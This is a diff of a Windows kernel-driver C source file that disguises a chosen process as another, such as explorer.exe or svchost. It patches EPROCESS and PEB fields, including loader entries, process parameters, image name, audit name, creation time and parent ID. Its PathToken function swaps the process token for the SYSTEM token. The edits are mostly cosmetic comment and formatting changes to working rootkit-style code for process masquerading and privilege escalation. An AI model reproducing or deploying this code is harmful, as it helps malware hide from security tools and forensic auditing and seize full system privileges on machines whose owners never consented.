@@ -1,30 +1,28 @@
+// YATTTAAAA ❗❗❗❗❗
+// <3
+//-------------------
 #include "pathme.h"
 
-#pragma warning(disable: 4214)
-#pragma warning(disable: 4057)
-#pragma warning(disable: 4201)
-#pragma warning(disable: 4267)
-
-typedef struct _LDR_DATA_TABLE_ENTRY                         // 24 elements, 0xE0 bytes (sizeof) 
+typedef struct _LDR_DATA_TABLE_ENTRY                         // 24 Elements, 0xE0 bytes (sizeof) 
 {
-    /*0x000*/     struct _LIST_ENTRY InLoadOrderLinks;                     // 2 elements, 0x10 bytes (sizeof)  
-    /*0x010*/     struct _LIST_ENTRY InMemoryOrderLinks;                   // 2 elements, 0x10 bytes (sizeof)  
-    /*0x020*/     struct _LIST_ENTRY InInitializationOrderLinks;           // 2 elements, 0x10 bytes (sizeof)  
+    /*0x000*/     struct _LIST_ENTRY InLoadOrderLinks;                     // 2 Elements, 0x10 Bytes (sizeof)  
+    /*0x010*/     struct _LIST_ENTRY InMemoryOrderLinks;                   // 2 Elements, 0x10 Bytes (sizeof)  
+    /*0x020*/     struct _LIST_ENTRY InInitializationOrderLinks;           // 2 Elements, 0x10 Bytes (sizeof)  
     /*0x030*/     VOID*        DllBase;
     /*0x038*/     VOID*        EntryPoint;
     /*0x040*/     ULONG32      SizeOfImage;
     /*0x044*/     UINT8        _PADDING0_[0x4];
-    /*0x048*/     struct _UNICODE_STRING FullDllName;                      // 3 elements, 0x10 bytes (sizeof)  
-    /*0x058*/     struct _UNICODE_STRING BaseDllName;                      // 3 elements, 0x10 bytes (sizeof)  
+    /*0x048*/     struct _UNICODE_STRING FullDllName;                      // 3 Elements, 0x10 Bytes (sizeof)  
+    /*0x058*/     struct _UNICODE_STRING BaseDllName;                      // 3 Elements, 0x10 Bytes (sizeof)  
 }LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
 
-typedef struct _CURDIR              // 2 elements, 0x18 bytes (sizeof) 
+typedef struct _CURDIR
 {
-    /*0x000*/     struct _UNICODE_STRING DosPath; // 3 elements, 0x10 bytes (sizeof) 
+    /*0x000*/     struct _UNICODE_STRING DosPath; // 3 Elements, 0x10 Bytes (sizeof) 
     /*0x010*/     VOID*        Handle;
 }CURDIR, *PCURDIR;
 
-typedef struct _RTL_USER_PROCESS_PARAMETERS                // 30 elements, 0x400 bytes (sizeof) 
+typedef struct _RTL_USER_PROCESS_PARAMETERS                // 30 Elements, 0x400 Bytes (sizeof) 
 {
     /*0x000*/     ULONG32      MaximumLength;
     /*0x004*/     ULONG32      Length;
@@ -36,10 +34,10 @@ typedef struct _RTL_USER_PROCESS_PARAMETERS                // 30 elements, 0x400
     /*0x020*/     VOID*        StandardInput;
     /*0x028*/     VOID*        StandardOutput;
     /*0x030*/     VOID*        StandardError;
-    /*0x038*/     struct _CURDIR CurrentDirectory;                       // 2 elements, 0x18 bytes (sizeof)   
-    /*0x050*/     struct _UNICODE_STRING DllPath;                        // 3 elements, 0x10 bytes (sizeof)   
-    /*0x060*/     struct _UNICODE_STRING ImagePathName;                  // 3 elements, 0x10 bytes (sizeof)   
-    /*0x070*/     struct _UNICODE_STRING CommandLine;                    // 3 elements, 0x10 bytes (sizeof)   
+    /*0x038*/     struct _CURDIR CurrentDirectory;                       // 2 Elements, 0x18 Bytes (sizeof)   
+    /*0x050*/     struct _UNICODE_STRING DllPath;                        // 3 Elements, 0x10 Bytes (sizeof)   
+    /*0x060*/     struct _UNICODE_STRING ImagePathName;                  // 3 Elements, 0x10 Bytes (sizeof)   
+    /*0x070*/     struct _UNICODE_STRING CommandLine;                    // 3 Elements, 0x10 Bytes (sizeof)   
     /*0x080*/     VOID*        Environment;
     /*0x088*/     ULONG32      StartingX;
     /*0x08C*/     ULONG32      StartingY;
@@ -51,22 +49,22 @@ typedef struct _RTL_USER_PROCESS_PARAMETERS                // 30 elements, 0x400
     /*0x0A4*/     ULONG32      WindowFlags;
     /*0x0A8*/     ULONG32      ShowWindowFlags;
     /*0x0AC*/     UINT8        _PADDING1_[0x4];
-    /*0x0B0*/     struct _UNICODE_STRING WindowTitle;                    // 3 elements, 0x10 bytes (sizeof)   
-    /*0x0C0*/     struct _UNICODE_STRING DesktopInfo;                    // 3 elements, 0x10 bytes (sizeof)   
-    /*0x0D0*/     struct _UNICODE_STRING ShellInfo;                      // 3 elements, 0x10 bytes (sizeof)   
-    /*0x0E0*/     struct _UNICODE_STRING RuntimeData;                    // 3 elements, 0x10 bytes (sizeof)   
+    /*0x0B0*/     struct _UNICODE_STRING WindowTitle;                    // 3 Elements, 0x10 Bytes (sizeof)   
+    /*0x0C0*/     struct _UNICODE_STRING DesktopInfo;                    // 3 Elements, 0x10 Bytes (sizeof)   
+    /*0x0D0*/     struct _UNICODE_STRING ShellInfo;                      // 3 Elements, 0x10 Bytes (sizeof)   
+    /*0x0E0*/     struct _UNICODE_STRING RuntimeData;                    // 3 Elements, 0x10 Bytes (sizeof)   
 }RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;
 
 
-typedef struct _PEB_LDR_DATA                            // 9 elements, 0x58 bytes (sizeof) 
+typedef struct _PEB_LDR_DATA
 {
     /*0x000*/     ULONG32      Length;
     /*0x004*/     UINT8        Initialized;
     /*0x005*/     UINT8        _PADDING0_[0x3];
     /*0x008*/     VOID*        SsHandle;
-    /*0x010*/     struct _LIST_ENTRY InLoadOrderModuleList;           // 2 elements, 0x10 bytes (sizeof) 
-    /*0x020*/     struct _LIST_ENTRY InMemoryOrderModuleList;         // 2 elements, 0x10 bytes (sizeof) 
-    /*0x030*/     struct _LIST_ENTRY InInitializationOrderModuleList; // 2 elements, 0x10 bytes (sizeof) 
+    /*0x010*/     struct _LIST_ENTRY InLoadOrderModuleList;
+    /*0x020*/     struct _LIST_ENTRY InMemoryOrderModuleList;
+    /*0x030*/     struct _LIST_ENTRY InInitializationOrderModuleList;
     /*0x040*/     VOID*        EntryInProgress;
     /*0x048*/     UINT8        ShutdownInProgress;
     /*0x049*/     UINT8        _PADDING1_[0x7];
@@ -74,15 +72,15 @@ typedef struct _PEB_LDR_DATA                            // 9 elements, 0x58 byte
 }PEB_LDR_DATA, *PPEB_LDR_DATA;
 
 
-typedef struct _PEB                                                                               // 91 elements, 0x380 bytes (sizeof) 
+typedef struct _PEB                                                                               // 91 Elements, 0x380 Bytes (sizeof) 
 {
     /*0x000*/     UINT8        InheritedAddressSpace;
     /*0x001*/     UINT8        ReadImageFileExecOptions;
     /*0x002*/     UINT8        BeingDebugged;
-    union                                                                                         // 2 elements, 0x1 bytes (sizeof)    
+    union                                                                                         // 2 Elements, 0x1 Bytes (sizeof)    
     {
         /*0x003*/         UINT8        BitField;
-        struct                                                                                    // 6 elements, 0x1 bytes (sizeof)    
+        struct                                                                                    // 6 Elements, 0x1 Bytes (sizeof)    
         {
             /*0x003*/             UINT8        ImageUsesLargePages : 1;                                                 // 0 BitPosition                     
             /*0x003*/             UINT8        IsProtectedProcess : 1;                                                  // 1 BitPosition                     
@@ -98,8 +96,12 @@ typedef struct _PEB                                                             
     /*0x020*/     struct _RTL_USER_PROCESS_PARAMETERS* ProcessParameters;
 }PEB, *PPEB;
 
-/*
-+0x2e0 ImageFileName    : [15]  "explorer.exe"
+
+
+
+
+//---------------------------------------------------------------------------------------
+/*+0x2e0 ImageFileName    : [15]  "explorer.exe"
 
 0: kd> dt _SE_AUDIT_PROCESS_CREATION_INFO fffffa80037a7b30+0x390
 nt!_SE_AUDIT_PROCESS_CREATION_INFO
@@ -123,10 +125,11 @@ PEB ProcessParameters
 +0x0a8 ShowWindowFlags  : 1
 +0x0b0 WindowTitle      : _UNICODE_STRING "C:\Windows\Explorer.EXE"
 +0x0c0 DesktopInfo      : _UNICODE_STRING "Winsta0\Default"
-+0x0d0 ShellInfo        : _UNICODE_STRING "C:\Windows\Explorer.EXE"
++0x0d0 ShellInfo        : _UNICODE_STRING "C:\Windows\Explorer.EXE"*/
+//---------------------------------------------------------------------------------------
 
-InLoadOrderModuleList InMemoryOrderLinks是同一片内存区域(前者+0x10就是后者 只需要改一个地方就行 最好前者)
-*/
+
+
 
 WCHAR* g_szTarSeAuditProcessName = NULL;
 WCHAR* g_szTarPebFullName = NULL;
@@ -137,12 +140,9 @@ WCHAR* g_szTarWin10ImageFilePointerName = NULL; //offset 0x448
 LARGE_INTEGER g_TarCreateTime = { 0 };
 ULONG_PTR g_TarInheritedFromUniqueProcessId = 0;
 
-// 获取被伪装的进程的一些信息
-NTSTATUS PsGetTarProcessInfo(HANDLE pid)
+NTSTATUS 
+PsGetTarProcessInfo(HANDLE pid)
 {
-    // SE_AUDIT_PROCESS_CREATION_INFO
-    // PEB ProcessParameters
-    // PEB Ldr
     PPEB peb = NULL;
     PLDR_DATA_TABLE_ENTRY ldr = NULL;
     PEPROCESS Process = NULL;
@@ -205,7 +205,7 @@ NTSTATUS PsGetTarProcessInfo(HANDLE pid)
 
         if (*NtBuildNumber > 9600)
         {
-            pFileObject = (PFILE_OBJECT)(*(PULONG_PTR)((ULONG_PTR)Process + 0x448)); //+0x448 ImageFilePointer 
+            pFileObject = (PFILE_OBJECT)(*(PULONG_PTR)((ULONG_PTR)Process + 0x448)); // ImageFilePointer 
             if (!MmIsAddressValid(pFileObject))
             {
                 ObDereferenceObject(Process);
@@ -216,9 +216,9 @@ NTSTATUS PsGetTarProcessInfo(HANDLE pid)
         }
 
         if(*NtBuildNumber < 9600)
-            SeAuditName = (PUNICODE_STRING)(*(PULONG_PTR)((ULONG_PTR)Process + 0x390)); // win7 offset 
+            SeAuditName = (PUNICODE_STRING)(*(PULONG_PTR)((ULONG_PTR)Process + 0x390)); // Offset W7
         else
-            SeAuditName = (PUNICODE_STRING)(*(PULONG_PTR)((ULONG_PTR)Process + 0x468)); // win10 offset 14393 15063 16299
+            SeAuditName = (PUNICODE_STRING)(*(PULONG_PTR)((ULONG_PTR)Process + 0x468)); // Offset W10
 
         if (!MmIsAddressValid(SeAuditName))
         {
@@ -241,6 +241,7 @@ NTSTATUS PsGetTarProcessInfo(HANDLE pid)
         }
         __except (1)
         {
+            // grow down
         }
 
         KeDetachProcess();
@@ -256,7 +257,8 @@ NTSTATUS PsGetTarProcessInfo(HANDLE pid)
     return status;
 }
 
-BOOLEAN PathWin10ImageNamePoint(PEPROCESS Process, WCHAR* szFullName)
+BOOLEAN 
+PathWin10ImageNamePoint(PEPROCESS Process, WCHAR* szFullName)
 {
     BOOLEAN bRet = FALSE;
     PFILE_OBJECT pFileObject = NULL;
@@ -378,6 +380,7 @@ BOOLEAN PathPebLdr(PEPROCESS Process, WCHAR* szFullName, WCHAR* szBaseName)
         }
         __except (1)
         {
+         // Haah!!
         }
 
     } while (FALSE);
@@ -388,7 +391,8 @@ BOOLEAN PathPebLdr(PEPROCESS Process, WCHAR* szFullName, WCHAR* szBaseName)
     return bRet;
 }
 
-BOOLEAN PathPebProcessParameters(PEPROCESS Process, WCHAR* szFullName)
+BOOLEAN 
+PathPebProcessParameters(PEPROCESS Process, WCHAR* szFullName)
 {
     BOOLEAN bRet = FALSE;
     BOOLEAN bAttach = FALSE;
@@ -438,7 +442,7 @@ BOOLEAN PathPebProcessParameters(PEPROCESS Process, WCHAR* szFullName)
         }
         __except (1)
         {
-
+            // shit,  don't be shy
         }
 
     } while (FALSE);
@@ -449,7 +453,6 @@ BOOLEAN PathPebProcessParameters(PEPROCESS Process, WCHAR* szFullName)
     return bRet;
 }
 
-// 这里的ProcessName 为全路径 \Device\HarddiskVolume1\Windows\explorer.exe 这里使用GetTarProcessInfo去获取即可
 BOOLEAN PathSeAuditProcessCreationInfo(PEPROCESS Process, WCHAR* ProcessName)
 {
     PUNICODE_STRING Name = NULL;
@@ -482,8 +485,8 @@ BOOLEAN PathSeAuditProcessCreationInfo(PEPROCESS Process, WCHAR* ProcessName)
     return TRUE;
 }
 
-// cName15字节的大小 分配内存时注意要大于15
-BOOLEAN PathImageFileName(PEPROCESS Process, char* cName)
+BOOLEAN 
+PathImageFileName(PEPROCESS Process, char* cName)
 {
     char    szNameBuff[15] = { 0 };
     char*   szProcessBuff = NULL;
@@ -506,22 +509,25 @@ BOOLEAN PathImageFileName(PEPROCESS Process, char* cName)
     return TRUE;
 }
 
-PACCESS_TOKEN GetProceesTokenAddress(ULONG_PTR Address)
+PACCESS_TOKEN 
+GetProceesTokenAddress(ULONG_PTR Address)
 {
-    //
-    // To get an address of a token from the Token field in EPROCESS, the lowest
-    // N bits where N is size of a RefCnt field needs to be masked.
-    //
+
+
+    //----------------------------------
     // kd> dt nt!_EX_FAST_REF
     //   + 0x000 Object : Ptr64 Void
     //   + 0x000 RefCnt : Pos 0, 4 Bits
     //   + 0x000 Value  : Uint8B
-    //
+    //----------------------------------
+
+    
     ULONG_PTR Value = *(ULONG_PTR*)(Address);
     return (PACCESS_TOKEN)(Value & ((ULONG_PTR)(~0xf)));
 }
 
-BOOLEAN PathToken(PEPROCESS Process)
+BOOLEAN 
+PathToken(PEPROCESS Process)
 {
     PACCESS_TOKEN CurrentToken = NULL;
     PACCESS_TOKEN SystemToken = NULL;
@@ -532,34 +538,24 @@ BOOLEAN PathToken(PEPROCESS Process)
     for (auto Offset = 0ul; Offset < sizeof(void *) * 0x80;
         Offset += sizeof(void *))
     {
-        // Is this address stores token?
         ULONG_PTR TestAddress = (ULONG_PTR)Process + Offset;
         PACCESS_TOKEN ProbableToken = GetProceesTokenAddress(TestAddress);
         if (ProbableToken == CurrentToken)
         {
-            // Found the field, replace the contents with the SYSTEM token
             PACCESS_TOKEN* TokenAddress = (PACCESS_TOKEN*)(TestAddress);
             *TokenAddress = SystemToken;
             bRet = TRUE;
             break;
         }
     }
-    //ULONG_PTR TestAddress = (ULONG_PTR)Process + 0x358;
-    //PACCESS_TOKEN ProbableToken = GetProceesTokenAddress(TestAddress);
-    //if (ProbableToken == CurrentToken)
-    //{
-    //    // Found the field, replace the contents with the SYSTEM token
-    //    PACCESS_TOKEN* TokenAddress = (PACCESS_TOKEN*)(TestAddress);
-    //    *TokenAddress = SystemToken;
-    //    bRet = TRUE;
-    //}
 
     PsDereferencePrimaryToken(CurrentToken);
     PsDereferencePrimaryToken(SystemToken);
     return bRet;
 }
 
-BOOLEAN PathCreateTime(PEPROCESS Process)
+BOOLEAN 
+PathCreateTime(PEPROCESS Process)
 {
     ULONG offset = 0;
     offset = *(PULONG)((ULONG_PTR)PsGetProcessCreateTimeQuadPart + 3);
@@ -571,7 +567,8 @@ BOOLEAN PathCreateTime(PEPROCESS Process)
     return FALSE;
 }
 
-BOOLEAN PathInheritedFromUniqueProcessId(PEPROCESS Process)
+BOOLEAN 
+PathInheritedFromUniqueProcessId(PEPROCESS Process)
 {
     ULONG offset = 0;
     offset = *(PULONG)((ULONG_PTR)PsGetProcessInheritedFromUniqueProcessId + 3);
@@ -583,13 +580,12 @@ BOOLEAN PathInheritedFromUniqueProcessId(PEPROCESS Process)
     return FALSE;
 }
 
-BOOLEAN PathModification(HANDLE pid)
+BOOLEAN 
+PathModification(HANDLE pid)
 {
     HANDLE SvchostPid = NULL;
     PEPROCESS Process = NULL;
-    //DbgBreakPoint();
 
-    // 不支持x86进程
     if (!PsIs64BitProcess(pid))
         return FALSE;
 
@@ -626,3 +622,8 @@ BOOLEAN PathModification(HANDLE pid)
     ObDereferenceObject(Process);
     return TRUE;
 }
+
+#pragma warning(disable: 4214)
+#pragma warning(disable: 4057)
+#pragma warning(disable: 4201)
+#pragma warning(disable: 4267)
